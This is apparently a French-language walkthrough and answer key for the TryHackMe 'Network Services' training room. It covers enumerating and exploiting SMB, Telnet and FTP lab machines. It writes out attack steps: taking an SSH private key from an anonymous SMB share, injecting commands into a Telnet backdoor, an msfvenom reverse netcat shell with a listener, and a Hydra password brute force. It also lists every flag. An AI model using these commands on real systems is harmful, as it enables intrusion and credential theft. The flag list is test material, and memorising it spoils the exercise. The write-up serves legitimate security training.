# TryHackMe: Network Services

**Objectif :** comprendre et exploiter trois services reseau courants, a savoir SMB, Telnet et FTP, en passant par l'enumeration, la collecte d'informations, l'acces initial et la lecture des flags associes a chaque mini-scenario.

---

## Introduction

La room **Network Services** est une room d'apprentissage structuree en trois laboratoires :

- SMB
- Telnet
- FTP

L'interet n'est pas de trouver une unique chaine de compromission, mais de pratiquer des reflexes qui reviennent en permanence :

- identifier les ports et services
- enumérer proprement
- tester les mauvaises configurations classiques
- comprendre ce qu'un service expose revele sur la machine

Je reprends ici toutes les questions utiles de la room avec le raisonnement et les commandes associes.

---

## Task 1: Get Connected

Cette partie sert uniquement a preparer l'environnement.

### Question: Ready? Let's get going!

### Reponse

`Done`

---

## Task 2: Understanding SMB

Cette section est theorique et pose les bases du protocole SMB.

### Question 1: What does SMB stand for?

SMB signifie :

```text
Server Message Block
```

### Reponse

**SMB stands for:** `Server Message Block`

### Question 2: What type of protocol is SMB?

La reponse est :

```text
response-request
```

### Reponse

**SMB protocol type:** `response-request`

### Question 3: What protocol suite do clients use to connect to the server?

Les clients se connectent classiquement via :

```text
TCP/IP
```

### Reponse

**Protocol suite:** `TCP/IP`

### Question 4: What systems does Samba run on?

Samba implemente SMB sur les systemes :

```text
Unix
```

### Reponse

**Systems Samba runs on:** `Unix`

---

## Task 3: Enumerating SMB

On passe maintenant a la cible deployable.

### Question 1: Conduct an nmap scan of your choosing, How many ports are open?

Je lance un scan simple :

```bash
nmap <IP>
```

Le scan remonte trois ports ouverts :

- `22`
- `139`
- `445`

### Reponse

**Open ports:** `3`

### Question 2: What ports is SMB running on? Provide the ports in ascending order.

SMB tourne ici sur :

```text
139/445
```

### Reponse

**SMB ports:** `139/445`

### Question 3: Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?

Je lance :

```bash
enum4linux <IP>
```

Le workgroup remonte comme :

```text
WORKGROUP
```

### Reponse

**Workgroup name:** `WORKGROUP`

### Question 4: What comes up as the name of the machine?

Dans la sortie `enum4linux`, le nom de machine est :

```text
POLOSMB
```

### Reponse

**Machine name:** `POLOSMB`

### Question 5: What operating system version is running?

La sortie SMB / OS information remonte :

```text
6.1
```

### Reponse

**OS version:** `6.1`

### Question 6: What share sticks out as something we might want to investigate?

Le share le plus interessant est :

```text
profiles
```

### Reponse

**Interesting share:** `profiles`

---

## Exploiting SMB

### Question 1: What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

La syntaxe attendue est :

```text
smbclient //10.10.10.2/secret -U suit -p 445
```

### Reponse

**Correct smbclient syntax:** `smbclient //10.10.10.2/secret -U suit -p 445`

### Question 2: Great! ... no answer needed

### Reponse

`Done`

### Question 3: Does the share allow anonymous access? Y/N?

Je teste :

```bash
smbclient //<IP>/profiles
```

Sans fournir d'identifiant, l'acces fonctionne.

### Reponse

**Anonymous access to share:** `Y`

### Question 4: Who can we assume this profile folder belongs to?

Dans le share, on trouve un document :

```text
Working From Home Information.txt
```

En le lisant :

```bash
more "Working From Home Information.txt"
```

on deduit que le profil appartient a :

```text
John Cactus
```

### Reponse

**Profile owner:** `John Cactus`

### Question 5: What service has been configured to allow him to work from home?

Le document mentionne explicitement :

```text
ssh
```

### Reponse

**Configured service:** `ssh`

### Question 6: Okay! Now we know this, what directory on the share should we look in?

Le reflexe logique est de chercher les cles dans :

```text
.ssh
```

### Reponse

**Directory to inspect:** `.ssh`

### Question 7: Which of these keys is most useful to us?

La cle privee la plus utile est :

```text
id_rsa
```

### Reponse

**Most useful key:** `id_rsa`

### Question 8: What is the smb.txt flag?

Je recupere la cle :

```bash
smbclient //<IP>/profiles
mget id_rsa
chmod 600 id_rsa
```

Puis je lis le contenu de `id_rsa.pub` pour identifier le nom d'utilisateur. Il s'agit de :

```text
cactus
```

Je me connecte ensuite :

```bash
ssh cactus@<IP> -i id_rsa
```

Une fois dans le shell :

```bash
cat smb.txt
```

### Reponse

**smb.txt:** `THM{smb_is_fun_eh?}`

---

## Task 5: Understanding Telnet

Cette partie est theorique.

### Question 1: What is Telnet?

La reponse est :

```text
application protocol
```

### Reponse

**Telnet type:** `application protocol`

### Question 2: What has slowly replaced Telnet?

Le remplacement moderne est :

```text
ssh
```

### Reponse

**Replacement for Telnet:** `ssh`

### Question 3: How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

### Reponse

**Telnet syntax example:** `telnet 10.10.10.3 23`

### Question 4: The lack of what, means that all Telnet communication is in plaintext?

### Reponse

**Missing property:** `encryption`

---

## Task 6: Enumerating Telnet

### Question 1: Okay, let's try and connect to this telnet port!

Le port cible est `8012`. Je me connecte donc avec :

```bash
telnet <IP> 8012
```

### Reponse

`Done`

### Question 2: Great! It's an open telnet connection! What welcome message do we receive?

La banniere affiche :

```text
SKIDY'S BACKDOOR.
```

### Reponse

**Welcome message:** `SKIDY'S BACKDOOR.`

### Question 3: Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

Les commandes ne renvoient rien directement.

### Reponse

**Do we get output?** `N`

### Question 4: Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.

### Reponse

`Done`

### Question 5: Start a tcpdump listener on your local machine.

### Reponse

`Done`

### Question 6: ... Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

Je teste la commande dans la session Telnet :

```text
.RUN ping <MON_IP_THM> -c 1
```

Avec un `tcpdump` en ecoute :

```bash
sudo tcpdump ip proto \\icmp -i tun0
```

On voit bien passer les paquets ICMP.

### Reponse

**Do we receive pings?** `Y`

### Question 7: Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!

### Reponse

`Done`

### Question 8: What word does the generated payload start with?

La room demande de generer :

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<MON_IP> lport=4444 R
```

Le payload commence par :

```text
mkfifo
```

### Reponse

**Payload starts with:** `mkfifo`

### Question 9: What would the command look like for the listening port we selected in our payload?

### Reponse

**Netcat listener command:** `nc -lvp 4444`

### Question 10: Great! ... send the payload

Je lance le listener puis j'injecte le payload avec `.RUN`.

### Reponse

`Done`

### Question 11: Success! What is the contents of flag.txt?

Une fois le reverse shell obtenu :

```bash
cat flag.txt
```

### Reponse

**flag.txt:** `THM{y0u_g0t_th3_t3ln3t_fl4g}`

---

## Task 9: Enumerating FTP

### Question 1: How many ports are open on the target machine?

Sur la cible FTP, un scan complet remonte :

```text
2
```

### Reponse

**Open ports on FTP target:** `2`

### Question 2: What port is ftp running on?

### Reponse

**FTP port:** `21`

### Question 3: What variant of FTP is running on it?

Avec `nmap -sV -p 21 <IP>`, on obtient :

```text
vsftpd
```

### Reponse

**FTP variant:** `vsftpd`

### Question 4: What is the name of the file in the anonymous FTP directory?

Je teste l'anonymous login :

```bash
ftp <IP>
```

Puis :

```bash
ls
```

Le fichier present est :

```text
PUBLIC_NOTICE.txt
```

### Reponse

**File in anonymous FTP directory:** `PUBLIC_NOTICE.txt`

### Question 5: What do we think a possible username could be?

En telechargeant puis lisant le fichier :

```bash
get PUBLIC_NOTICE.txt
cat PUBLIC_NOTICE.txt
```

la room mene au nom d'utilisateur :

```text
mike
```

### Reponse

**Possible username:** `mike`

### Question 6: Great! Now we've got details ...

### Reponse

`Done`

---

## Task 10: Exploiting FTP

### Question 1: What is the password for the user "mike"?

Je bruteforce avec Hydra :

```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <IP> ftp
```

Le mot de passe trouve est :

```text
password
```

### Reponse

**Password for mike:** `password`

### Question 2: Bingo! Now, let's connect to the FTP server as this user ...

Je me reconnecte avec :

```bash
ftp <IP>
```

Puis j'utilise :

- utilisateur : `mike`
- mot de passe : `password`

### Reponse

`Done`

### Question 3: What is ftp.txt?

Une fois connecte :

```bash
ls
get ftp.txt
cat ftp.txt
```

### Reponse

**ftp.txt:** `THM{y0u_g0t_th3_ftp_fl4g}`

---

## Resume des reponses de la room

- Ready? Let's get going! `Done`
- What does SMB stand for? `Server Message Block`
- What type of protocol is SMB? `response-request`
- What protocol suite do clients use to connect to the server? `TCP/IP`
- What systems does Samba run on? `Unix`
- Conduct an nmap scan ... How many ports are open? `3`
- What ports is SMB running on? `139/445`
- What is the workgroup name? `WORKGROUP`
- What comes up as the name of the machine? `POLOSMB`
- What operating system version is running? `6.1`
- What share sticks out as something we might want to investigate? `profiles`
- Correct syntax for secret share example `smbclient //10.10.10.2/secret -U suit -p 445`
- Does the share allow anonymous access? `Y`
- Who can we assume this profile folder belongs to? `John Cactus`
- What service has been configured to allow him to work from home? `ssh`
- What directory on the share should we look in? `.ssh`
- Which of these keys is most useful to us? `id_rsa`
- What is the smb.txt flag? `THM{smb_is_fun_eh?}`
- What is Telnet? `application protocol`
- What has slowly replaced Telnet? `ssh`
- How would you connect to a Telnet server with the IP 10.10.10.3 on port 23? `telnet 10.10.10.3 23`
- The lack of what means Telnet communication is plaintext? `encryption`
- Telnet connect `Done`
- What welcome message do we receive? `SKIDY'S BACKDOOR.`
- Do we get a return on any input? `N`
- Start a tcpdump listener `Done`
- Do we receive any pings? `Y`
- What word does the generated payload start with? `mkfifo`
- Netcat listener command `nc -lvp 4444`
- What is the contents of flag.txt? `THM{y0u_g0t_th3_t3ln3t_fl4g}`
- How many ports are open on the FTP target machine? `2`
- What port is ftp running on? `21`
- What variant of FTP is running on it? `vsftpd`
- What is the name of the file in the anonymous FTP directory? `PUBLIC_NOTICE.txt`
- What do we think a possible username could be? `mike`
- What is the password for the user "mike"? `password`
- What is ftp.txt? `THM{y0u_g0t_th3_ftp_fl4g}`

---

## Conclusion

**Network Services** est une excellente room de bases. Elle ne cherche pas a etre subtile, mais elle apprend exactement ce qu'il faut apprendre au debut : lire les services ouverts, choisir les bons outils d'enumeration, tester les mauvaises configurations les plus probables et transformer de petits indices en acces reel.

***Auteur*** *: Saad Idrissi*
